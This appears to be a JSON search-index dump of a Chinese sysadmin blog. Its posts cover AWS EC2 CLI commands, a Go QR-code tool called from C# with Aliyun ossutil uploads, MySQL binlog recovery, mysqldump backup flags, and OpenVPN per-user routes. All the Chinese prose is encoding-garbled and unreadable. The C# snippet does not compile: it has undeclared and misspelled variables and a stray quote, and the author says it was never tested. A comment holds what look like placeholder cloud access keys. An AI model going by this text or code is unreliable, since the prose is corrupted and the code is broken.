\u0026#34;.PublicIp\u0026#34; /tmp/eip.log) 22 23#ç»™ec2èµ‹ipï¼Œå‰ææ˜¯çŸ¥é“ec2_id 24aws ec2 associate-address --instance-id ${ec2_id} --allocation-id ${eip_id} 25 26 27---------------------------- 28 29#å¯åŠ¨æ–°ec2çš„æ–¹æ³•ï¼š 30#å¯åŠ¨ec2 31aws ec2 run-instances \\ 32--region $Region --count 1 \\ 33--instance-type t2.micro \\ 34--subnet-id ${lan_a_public_id} \\ 35--security-group-ids $gid \\ 36--key-name MySshKey \\ 37--image-id ami-04ff9e9b51c1f62ca \\ 38 |tee /tmp/ec2.log 39 40ec2_id=$(jq -r \u0026#34;.Instances[0].InstanceId\u0026#34; /tmp/ec2.log) å‚è€ƒï¼š https://www.cnblogs.com/elvi/p/16542406.html ","date":"2022-11-23","img":"","permalink":"https://rendoumi.com/posts/20221123-freelancer_aws/","series":null,"tags":null,"title":"Freelancerä¹‹aws"},{"categories":null,"content":"å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\n1TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼Œç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡ 2TODO:å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘0Sæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›– åˆå…·ä½“è¯¢é—®äº†ä¸€ä¸‹ç»†èŠ‚ï¼Œæ˜¯ä¸€ä¸ª csharp çš„ç¨‹åº\n1var sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime); 2 3// TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡ 4 5 6// TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼Œ çœ‹äº†ä¸€ä¸‹ï¼Œè§‰å¾—æ€è·¯å¦‚ä¸‹ï¼Œè¿™æ˜¯ä¸ªç®¡é“æµï¼Œæ— è®ºå¾’æ‰‹å†™ä»£ç ç”ŸæˆQRCODE(è¿˜æœ‰ä¸ªlogoå›¾éœ€è¦æ”¾åˆ°äºŒç»´ç ä¸­å¤®)ï¼Œè¿˜æ˜¯é›†æˆOSSçš„SDKéƒ½éº»çƒ¦\næœ€å¿«é€Ÿæ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨å¤–éƒ¨æˆç¨‹åºåšè¿™ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨Goå†™ä¸ªç¨‹åºç”ŸæˆäºŒç»´ç ï¼Œç¬¬äºŒæ­¥ç”¨é˜¿é‡Œçš„ossutil64å·¥å…·ä¸Šä¼ \nä¸€ã€Goç¨‹åºGenå‡ºQRCode go æœ‰å¾ˆå¤šåº“ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ç”¨å¥½äº†ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šéƒ½æ˜¯è€ä»£ç ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½ go1.13.15 æ¥ç”¨\n1# ä¸‹è½½go 1.13.15ï¼Œè§£å‹åˆ°E:\\goï¼Œå¹¶å»ºç«‹ä¸€ä¸ªE:\\go\\go-workç›®å½•ï¼Œä¸‹è½½çš„æ¨¡å—ä¼šæ”¾åˆ°è¿™é‡Œ 2https://dl.google.com/go/go1.13.15.windows-amd64.zip 3 4# è®¾ç½®ä¸‰ä¸ªå˜é‡ 5GOROOT=E:\\go 6GOPATH=E:\\go\\go-work 7PATHä¸­å¢åŠ å¥½E:\\go\\binçš„ç›®å½• 8 9# è®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œæœ‰æ—¶å€™æ¨¡å—æ‹‰ä¸ä¸‹æ¥ 10go env -w GOPROXY=https://goproxy.cn,direct ç„¶åå°±å‡†å¤‡gen qrcodeçš„ç¨‹åºï¼Œmain.go\n1package main 2 3import ( 4\t\u0026#34;flag\u0026#34; 5\t\u0026#34;image\u0026#34; 6\t\u0026#34;image/draw\u0026#34; 7\t\u0026#34;image/jpeg\u0026#34; 8\t_ \u0026#34;image/png\u0026#34; 9\t\u0026#34;os\u0026#34; 10\t\u0026#34;path/filepath\u0026#34; 11 12\t\u0026#34;github.com/LyricTian/logger\u0026#34; 13\t\u0026#34;github.com/nfnt/resize\u0026#34; 14\t\u0026#34;github.com/skip2/go-qrcode\u0026#34; 15) 16 17var ( 18\ttext string 19\tlogo string 20\tpercent int 21\tsize int 22\tout string 23) 24 25func init() { 26\tflag.StringVar(\u0026amp;text, \u0026#34;t\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç å†…å®¹\u0026#34;) 27\tflag.StringVar(\u0026amp;logo, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;äºŒç»´ç Logo(png)\u0026#34;) 28\tflag.IntVar(\u0026amp;percent, \u0026#34;p\u0026#34;, 15, \u0026#34;äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%)\u0026#34;) 29\tflag.IntVar(\u0026amp;size, \u0026#34;s\u0026#34;, 256, \u0026#34;äºŒç»´ç çš„å¤§å°(é»˜è®¤256)\u0026#34;) 30\tflag.StringVar(\u0026amp;out, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;è¾“å‡ºæ–‡ä»¶\u0026#34;) 31} 32 33func main() { 34\tflag.Parse() 35 36\tif text == \u0026#34;\u0026#34; { 37\tlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šäºŒç»´ç çš„ç”Ÿæˆå†…å®¹\u0026#34;) 38\t} 39 40\tif out == \u0026#34;\u0026#34; { 41\tlogger.Fatalf(\u0026#34;è¯·æŒ‡å®šè¾“å‡ºæ–‡ä»¶\u0026#34;) 42\t} 43 44\tif exists, err := checkFile(out); err != nil { 45\tlogger.Fatalf(\u0026#34;æ£€æŸ¥è¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error()) 46\t} else if exists { 47\tlogger.Fatalf(\u0026#34;è¾“å‡ºæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯·é‡æ–°æŒ‡å®š\u0026#34;) 48\t} 49 50\tcode, err := qrcode.New(text, qrcode.Highest) 51\tif err != nil { 52\tlogger.Fatalf(\u0026#34;åˆ›å»ºäºŒç»´ç å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error()) 53\t} 54 55\tsrcImage := code.Image(size) 56\tif logo != \u0026#34;\u0026#34; { 57\tlogoSize := float64(size) * float64(percent) / 100 58 59\tsrcImage, err = addLogo(srcImage, logo, int(logoSize)) 60\tif err != nil { 61\tlogger.Fatalf(\u0026#34;å¢åŠ Logoå‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error()) 62\t} 63\t} 64 65\toutAbs, err := filepath.Abs(out) 66\tif err != nil { 67\tlogger.Fatalf(\u0026#34;è·å–è¾“å‡ºæ–‡ä»¶ç»å¯¹è·¯å¾„å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error()) 68\t} 69 70\tos.MkdirAll(filepath.Dir(outAbs), 0777) 71\toutFile, err := os.Create(outAbs) 72\tif err != nil { 73\tlogger.Fatalf(\u0026#34;åˆ›å»ºè¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s\u0026#34;, err.Error()) 74\t} 75\tdefer outFile.Close() 76 77\tjpeg.Encode(outFile, srcImage, \u0026amp;jpeg.Options{Quality: 100}) 78 79\tlogger.Infof(\u0026#34;äºŒç»´ç ç”ŸæˆæˆåŠŸï¼Œæ–‡ä»¶è·¯å¾„ï¼š%s\u0026#34;, outAbs) 80} 81 82func checkFile(name string) (bool, error) { 83\t_, err := os.Stat(name) 84\tif err != nil { 85\tif os.IsNotExist(err) { 86\treturn false, nil 87\t} 88\treturn false, err 89\t} 90\treturn true, nil 91} 92 93func resizeLogo(logo string, size uint) (image.Image, error) { 94\tfile, err := os.Open(logo) 95\tif err != nil { 96\treturn nil, err 97\t} 98\tdefer file.Close() 99 100\timg, _, err := image.Decode(file) 101\tif err != nil { 102\treturn nil, err 103\t} 104 105\timg = resize.Resize(size, size, img, resize.Lanczos3) 106\treturn img, nil 107} 108 109func addLogo(srcImage image.Image, logo string, size int) (image.Image, error) { 110\tlogoImage, err := resizeLogo(logo, uint(size)) 111\tif err != nil { 112\treturn nil, err 113\t} 114 115\toffset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2) 116\tb := srcImage.Bounds() 117\tm := image.NewNRGBA(b) 118\tdraw.Draw(m, b, srcImage, image.ZP, draw.Src) 119\tdraw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over) 120 121\treturn m, nil 122} ä¸Šé¢å¾ˆç®€å•ï¼Œç”¨åˆ°äº†åˆ«äººçš„ä¸‰ä¸ªæ¨¡å—ï¼Œéœ€è¦å®‰è£…ä¸€ä¸‹\n1go get -u github.com/LyricTian/logger@latest 2go get -u github.com/nfnt/resize@latest 3go get -u github.com/skip2/go-qrcode@latest æ³¨æ„ï¼Œè¿™äº›å‘½ä»¤æ˜¯é’ˆå¯¹ go 1.13.15 çš„ï¼Œå¦‚æœç”¨é«˜ç‰ˆæœ¬çš„ï¼Œå‘½ä»¤æ˜¯ä¸ä¸€æ ·çš„\nç„¶åå°±ç¼–è¯‘\n1go build -o qr.exe main.go æ‰¾ä¸ªä¸­å¿ƒå›¾ï¼Œç„¶åæµ‹è¯•\n1E:\\qr\\qr.exe -h 2Usage of qr: 3 -l string 4 äºŒç»´ç Logo(png) 5 -o string 6 è¾“å‡ºæ–‡ä»¶ 7 -p int 8 äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%) (default 15) 9 -s int 10 äºŒç»´ç çš„å¤§å°(é»˜è®¤256) (default 256) 11 -t string 12 äºŒç»´ç å†…å®¹ 13 14E:\\qr\\qr.exe -t \u0026#34;http://www.zz.ha.cn\u0026#39; -l logo.png -o qr.png å°±ä¼šç”ŸæˆäºŒç»´ç å›¾åƒ\näºŒã€ç”¨ossutils64.exeä¸Šä¼ OSS è¿™ä¸ªå°±ç®€å•äº†ï¼Œä¸‹è½½é˜¿é‡Œçš„å·¥å…·ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­\n1ossutil64.exe --config-file oss.conf cp ä¸Šä¼ æ–‡ä»¶ s3://æ¡¶å/\u0026#34;; ä¸‰ã€æ•´åˆè¿›csharp è¿™æ­¥ä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œæ¶‰åŠåˆ°csharpçš„å•ç‹¬è¯­æ³•\n1var sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime); 2 3// TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡ 4 for (int i = 0; i \u0026lt; sortFiles.Length; ++i) { 5 sortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]); 6 7 System.Diagnostics.Process process = new System.Diagnostics.Process(); 8 System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); 9 startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; 10 startInfo1.FileName = \u0026#34;qr.exe\u0026#34;; 11 string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); 12 startInfo1.Arguments = param01; 13 process.StartInfo = startInfo1; 14 process.Start(); 15 16 // TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼ŒAccessKey ID: LTAI5bbbb AccessKey Secret: NZPwtssss 17 System.Diagnostics.Process process = new System.Diagnostics.Process(); 18 System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); 19 startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; 20 startInfo1.FileName = \u0026#34;ossutil64.exe\u0026#34;; 21 startInfo1.Arguments = \u0026#34;--config-file oss.conf cp sortFiles[i] s3:///\u0026#34;; 22 string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); 23 process.StartInfo = startInfo1; 24 process.Start(); 25 26 } å…³é”®ç‚¹æœ‰ä¸¤ä¸ªï¼š\n1ã€è·å–sortFilesæœ‰åç¼€ï¼Œéœ€è¦å»æ‰\n1for (int i = 0; i \u0026lt; sortFiles.Length; ++i) { 2 sortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]); 3} 2ã€è¦æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦åå°æ‰§è¡Œ\n1 System.Diagnostics.Process process = new System.Diagnostics.Process(); 2 System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); 3 startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; 4 startInfo1.FileName = \u0026#34;qr.exe\u0026#34;; 5 string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); 6 startInfo1.Arguments = param01; 7 process.StartInfo = startInfo1; 8 process.Start(); è¿™æ ·å°±æå®Œäº†ï¼Œä½†æ˜¯ï¼Œæ²¡çœŸæœºæµ‹è¯•å•Šï¼Œgoå’Œossçš„éƒ¨åˆ†æ²¡é—®é¢˜ï¼Œcsharpçš„éƒ¨åˆ†æ²¡æœ‰çœŸæœºï¼Œæ— æ³•éªŒè¯ã€‚\n","date":"2022-11-23","img":"","permalink":"https://rendoumi.com/posts/20221123-freelancer_qrcode/","series":null,"tags":null,"title":"Freelancerä¹‹QRCode"},{"categories":null,"content":"æˆ‘ä»¬æ¥è¯´æ¢å¤çš„ç¬¬äºŒç§æƒ…å†µï¼Œå°±æ˜¯éœ€è¦ä»binlogä¸­æŒ‡å®šä½ç½®æ¢å¤\nbinlogå¦‚ä½•è®¾ç½®ä¸è¯´äº†ï¼Œæˆ‘ä»¬å‡è®¾ä¸Šæ¬¡ç”¨mysqldumpåšè¿‡ä¸€æ¬¡å…¨é‡å¤‡ä»½ã€‚\n1mysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B åº“å \u0026gt; åº“å.sql ç”±äºæˆ‘ä»¬åœ¨å¤‡ä»½ä¸­ä½¿ç”¨äº†å‚æ•°\u0026ndash;flush-logs \u0026ndash;master-data=2ï¼Œæ‰€ä»¥ åº“å.sql ä¸­ä¼šæœ‰binglogçš„ä¿¡æ¯ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚\nä¸€ã€ç”¨mysqlbinlogæ¥æ¢å¤ æˆ‘ä»¬é¦–å…ˆè¦æŸ¥åˆ°éšåçš„binlogæ–‡ä»¶æ˜¯é‚£ä¸ªï¼Œä»é‚£æ—¶å€™èµ·åˆç”Ÿæˆå¤šå°‘ä¸ªbinglogæ–‡ä»¶ã€‚\nç„¶åå»åº“é‡ŒæŸ¥è¯¢ï¼š\n1show master logs; 2show master status; æˆ‘ä»¬è¦åˆ†æä¸€ä¸‹SQL\n1# show binlog events [IN \u0026#39;log_name\u0026#39;] [FROM pos] [LIMIT [offset,] row_count]; 2 3show binlog events in \u0026#39;javaboy_logbin.000002\u0026#39; limit 5,10; æˆ‘ä»¬æ¥ç¿»çœ‹æ—¥å¿—ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯ä» 764\u0026ndash;\u0026gt;865 ï¼Œå‘ç”Ÿäº†åˆ é™¤ï¼Œé‚£ä¹ˆå›æ”¾åˆ°è¿™ä¸ª764è¿™ä¸ªpositionå‰å³å¯ï¼Œ764ä¸ä¼šæ‰§è¡Œ\n1mysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p \u0026ndash;start-positionæŒ‡å®šä»å“ªé‡Œå¼€å§‹æ¢å¤ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¼šä»binlogæ–‡ä»¶å¼€å¤´çš„positionå¼€å§‹\n1mysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position=205 --stop-position=764 --database=bbb | mysql -uroot -p äºŒã€ç”¨binglog2sqlæ¥æ¢å¤ binlog2sql æ˜¯å¤§ä¼—ç‚¹è¯„å…¬å¸çš„DBA å¼€å‘çš„ä¸€æ¬¾åŸºäºé€šè¿‡è§£æbinlogå°†delete æ¢å¤ä¸ºinsert,update çš„å€¼ set å­—æ®µå’Œwhereæ¡ä»¶åšå¯¹è°ƒçš„åŸç†æ¥æ¢å¤æ•°æ®çš„ã€‚ ä½¿ç”¨é™åˆ¶ MySQLçš„binlog format å¿…é¡»æ˜¯row å®‰è£…\nç®€å•è¯´å®ƒçš„é“ç†å°±æ˜¯å˜åˆ ä¸ºå¢ï¼Œç”Ÿæˆæ–°çš„SQLæ‰§è¡Œã€‚æ„Ÿè§‰ yearning çš„å›æ»šåº”è¯¥å°±æ˜¯åŸºäºè¿™ä¸ªä¸œè¥¿æå¾—ã€‚\nåœ°å€ï¼šhttps://github.com/danfengcao/binlog2sql\nè§£æå‡ºå›æ»šçš„SQLï¼š\n1python binlog2sql.py --flashback -h127.0.0.1 -P3306 -uadmin -p\u0026#39;admin\u0026#39; -dtest -ttest3 --start-file=\u0026#39;mysql-bin.000002\u0026#39; --start-position=763 --stop-position=1147 \u0026gt; rollback.sql å›æ»šå‰åŠ¡å¿…å†å¤‡ä»½ä¸€ä¸‹\n1mysql -h127.0.0.1 -P3306 -uadmin -p \u0026lt; rollback.sql ","date":"2022-11-22","img":"","permalink":"https://rendoumi.com/posts/20221122-mysqldump_binlog/","series":null,"tags":null,"title":"MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹äºŒ"},{"categories":null,"content":"å–œå¤§æ™®å¥”ï¼Œå¹²äº†ä¸€ä¸ªæœˆçš„MySQL DBAçš„å·¥ä½œï¼Œåˆå­¦åˆ°äº†ä¸€éƒ¨åˆ†çŸ¥è¯†ã€‚\nè®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡ä¸æ—¶åªéœ€\nmysqldump çš„å¤‡ä»½å…¶å®å¾ˆéº»çƒ¦ï¼Œè¦è€ƒè™‘å¾ˆå¤šå› ç´ \nå¤‡ä»½æ—¶å€™ä¸èƒ½é”è¡¨ æ¢å¤çš„æ—¶å€™è¦å¿« æœ‰äºŒè¿›åˆ¶æ•°æ®çš„è¯éœ€è¦å¤‡ä»½äºŒè¿›åˆ¶æ•°æ® æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½ é€šå¸¸ mysqldump æ˜¯åšæ¯å¤©çš„fullbackupï¼Œè¦ä¸ºä¹‹åçš„ binlog åšå¥½å‡†å¤‡ï¼Œä¸‡ä¸€è¦æ¢å¤è¦æå‰åšå¥½å‡†å¤‡ æˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥è¯´ï¼š\nä¸€ã€å¤‡ä»½æ—¶ä¸èƒ½é”è¡¨\n1--single-transaction 2é€šè¿‡å°†å¯¼å‡ºæ“ä½œå°è£…åœ¨ä¸€ä¸ªäº‹åŠ¡å†…æ¥ä½¿å¾—å¯¼å‡ºçš„æ•°æ®æ˜¯ä¸€ä¸ªä¸€è‡´æ€§å¿«ç…§ 3è¯¥é€‰é¡¹åœ¨å¯¼å‡ºæ•°æ®ä¹‹å‰æäº¤ä¸€ä¸ªBEGIN SQLè¯­å¥ï¼ŒBEGINä¸ä¼šé˜»å¡ä»»ä½•åº”ç”¨ç¨‹åºä¸”èƒ½ä¿è¯å¯¼å‡ºæ—¶æ•°æ®åº“çš„ä¸€è‡´æ€§çŠ¶æ€ã€‚ 4å®ƒåªé€‚ç”¨äºInnoDBå­˜å‚¨å¼•æ“ã€‚ 5æœ¬é€‰é¡¹å’Œ--lock-tablesé€‰é¡¹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸ºLOCK TABLESä¼šä½¿ä»»ä½•æŒ‚èµ·çš„äº‹åŠ¡éšå«æäº¤ã€‚ äºŒã€æ¢å¤æ—¶è¦å°½é‡å¿«\n1--opt 2ç­‰åŒäº--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys è¯¥é€‰é¡¹é»˜è®¤å¼€å¯, å¯ä»¥ç”¨--skip-optç¦ç”¨. 3 4--extended-insert, -e 5--extended-insert=false 6ä½¿ç”¨å…·æœ‰å¤šä¸ªVALUESåˆ—çš„INSERTè¯­æ³•ã€‚è¿™æ ·ä½¿å¯¼å‡ºæ–‡ä»¶æ›´å°ï¼Œå¹¶åŠ é€Ÿå¯¼å…¥æ—¶çš„é€Ÿåº¦ã€‚ 7é»˜è®¤ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œä½¿ç”¨--skip-extended-insertå–æ¶ˆé€‰é¡¹ã€‚ ä¸‰ã€æœ‰äºŒè¿›åˆ¶çš„æŒ‰äºŒè¿›åˆ¶å¤‡ä»½\n1--hex-blob 2ä½¿ç”¨åå…­è¿›åˆ¶æ ¼å¼å¯¼å‡ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²å­—æ®µã€‚å¦‚æœæœ‰äºŒè¿›åˆ¶æ•°æ®å°±å¿…é¡»ä½¿ç”¨è¯¥é€‰é¡¹ã€‚å½±å“åˆ°çš„å­—æ®µç±»å‹æœ‰BINARYã€VARBINARYã€BLOBã€‚ å››ã€æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½\n1--triggers 2å¯¼å‡ºè§¦å‘å™¨ã€‚è¯¥é€‰é¡¹é»˜è®¤å¯ç”¨ï¼Œç”¨--skip-triggersç¦ç”¨å®ƒã€‚ 3--routines, -R 4å¯¼å‡ºå­˜å‚¨è¿‡ç¨‹ä»¥åŠè‡ªå®šä¹‰å‡½æ•° äº”ã€ä¸ºä¹‹åå¦‚æœè¦åšbinlogæ¢å¤æå‰åšå¥½å‡†å¤‡\n1--flush-logs 2å¼€å§‹å¯¼å‡ºä¹‹å‰åˆ·æ–°binlogæ—¥å¿—ã€‚ 3è¯·æ³¨æ„ï¼šå‡å¦‚ä¸€æ¬¡å¯¼å‡ºå¤šä¸ªæ•°æ®åº“(ä½¿ç”¨é€‰é¡¹--databasesæˆ–è€…--all-databases)ï¼Œå°†ä¼šé€ä¸ªæ•°æ®åº“åˆ·æ–°æ—¥å¿—ã€‚ 4é™¤éä½¿ç”¨--lock-all-tablesæˆ–è€…--master-dataå¤–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ—¥å¿—å°†ä¼šè¢«åˆ·æ–°ä¸€æ¬¡ï¼Œç›¸åº”çš„æ‰€ä»¥è¡¨åŒæ—¶è¢«é”å®šã€‚ 5å› æ­¤ï¼Œå¦‚æœæ‰“ç®—åŒæ—¶å¯¼å‡ºå’Œåˆ·æ–°æ—¥å¿—åº”è¯¥ä½¿ç”¨--lock-all-tables æˆ–è€…--master-data å’Œ--flush-logs 6 7--master-data 8åœ¨å¯¼å‡ºçš„æ—¶å€™åŒæ—¶ç”Ÿæˆbinlogæ–‡ä»¶åå’Œä½ç½®åœ¨å¯¼å‡ºçš„æ–‡ä»¶å¼€å¤´ã€‚ 9è¿™ä¸ªéå¸¸é‡è¦ã€‚binlog çš„æ–‡ä»¶å’Œä½ç½®å¯ä»¥ä»è¿™é‡Œæ‹¿åˆ°ã€‚ 10ä¾‹å¦‚ï¼š 11-- CHANGE MASTER TO MASTER_LOG_FILE=\u0026#39;binlog.000001\u0026#39;, MASTER_LOG_POS=157; 12 13è¯¥é€‰é¡¹å°†binlogçš„ä½ç½®å’Œæ–‡ä»¶åè¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶ä¸­ã€‚ 14å¦‚æœä¸º1ï¼Œå°†ä¼šè¾“å‡ºCHANGE MASTER å‘½ä»¤ï¼› 15å¦‚æœä¸º2ï¼Œè¾“å‡ºçš„CHANGE MASTERå‘½ä»¤å‰æ·»åŠ æ³¨é‡Šä¿¡æ¯ã€‚ 16è¯¥é€‰é¡¹å°†æ‰“å¼€--lock-all-tables é€‰é¡¹ï¼Œé™¤é--single-transactionä¹Ÿè¢«æŒ‡å®šï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¨å±€è¯»é”åœ¨å¼€å§‹å¯¼å‡ºæ—¶è·å¾—å¾ˆçŸ­çš„æ—¶é—´ï¼›å…¶ä»–å†…å®¹å‚è€ƒä¸‹é¢çš„--single-transactioné€‰é¡¹ï¼‰ã€‚ 17è¯¥é€‰é¡¹è‡ªåŠ¨å…³é—­--lock-tablesé€‰é¡¹ã€‚ 18mysqldump -uroot -p --host=localhost --all-databases --master-data=1; 19mysqldump -uroot -p --host=localhost --all-databases --master-data=2; é‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œæ€»ç»“ä¸€è¡Œéå¸¸ä½¿ç”¨çš„å¤‡ä»½è¯­å¥ï¼š\n1mysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B åº“å \u0026gt; åº“å.sql ","date":"2022-11-21","img":"","permalink":"https://rendoumi.com/posts/20221121-mysqldump/","series":null,"tags":null,"title":"MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹ä¸€"},{"categories":null,"content":"å…¬å¸ç”¨çš„ OpenVPN ï¼Œç ”å‘éƒ¨é—¨å’Œæ™®é€šå‘˜å·¥çš„æƒé™ä¸ä¸€æ ·ï¼ŒæŠ€æœ¯éƒ¨é—¨éœ€è¦è®¿é—®æœåŠ¡å™¨ï¼Œæ™®é€šå‘˜å·¥åˆ™ä¸éœ€è¦\nè¿™æ ·çš„è¯å°±éœ€è¦æ ¹æ®ç”¨æˆ·å®šåˆ¶è·¯ç”±äº†ï¼ŒæŠ€æœ¯éƒ¨é—¨æ¨é€ç‰¹å®šçš„è·¯ç”±ï¼Œæ™®é€šå‘˜å·¥ä¸æ¨é€ã€‚\né‚£ä¹ˆåšæ³•å¦‚ä¸‹ï¼Œåœ¨ server.conf åšå¦‚ä¸‹è®¾å®šï¼š\n1ifconfig-pool-persist /etc/openvpn/conf/ipp.txt 2client-config-dir /etc/openvpn/conf/static ç¬¬ä¸€è¡Œæ˜¯æŒ‡å®šè®°å½• ip åœ°å€çš„æ–‡ä»¶ï¼Œä½œç”¨æ˜¯å¦‚æœæœåŠ¡å™¨è¿›ç¨‹é‡å¯äº†ï¼Œé‡å¯åä¼šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯é‡æ–°æ‹¨å·åè·å¾—çš„ IP å°±ä¸ä¼šå˜ï¼Œè¿˜æ˜¯é‡å¯å‰çš„ IPã€‚\nç¬¬äºŒè¡Œæ˜¯æŒ‡å®šäº†å®¢æˆ·ç«¯çš„å•ç‹¬é…ç½®\næˆ‘ä»¬å‡è®¾ä¸€ä¸ªç”¨æˆ·æ˜¯ zhangranruiï¼Œé‚£ä¹ˆå°±å» /etc/openvpn/conf/static ä¸‹å»ºç«‹ä¸€ä¸ª zhangranrui çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1# å‰é¢æ˜¯å®¢æˆ·ç«¯å›ºå®šIPåœ°å€ï¼Œåé¢æ˜¯ç½‘å…³åœ°å€ 2ifconfig-push 172.18.0.10 172.18.0.9 3 4# æ¨é€è·¯ç”±ï¼Œåé¢æ˜¯æ©ç  5push \u0026#34;route 10.10.0.0 255.255.0.0\u0026#34; 6 7# é‡å®šå‘å®¢æˆ·ç«¯çš„æ‰€æœ‰æµé‡ï¼Œå¦åˆ™è®¿é—®æœåŠ¡ç«¯å†…ç½‘è¦åƒä¸Šé¢ä¸€æ ·æ¨é€è·¯ç”± 8# push \u0026#34;redirect-gateway def1\u0026#34; 9 10# æ¨é€ç»™å®¢æˆ·ç«¯çš„DNSè§£æåœ°å€ 11# push \u0026#34;dhcp-option DNS 223.5.5.5\u0026#34; 12# push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34; ä¸Šé¢æˆ‘ä»¬å›ºå®šäº†IPï¼Œä¹Ÿæ¨é€äº†ç‰¹å®šè·¯ç”±ï¼Œé‚£ä¹ˆæ€ä¹ˆçŸ¥é“ä¸€ä¸ªå®¢æˆ·çš„ ip å‘¢ï¼Œå»çœ‹ ipp æ–‡ä»¶ï¼š\n1cat 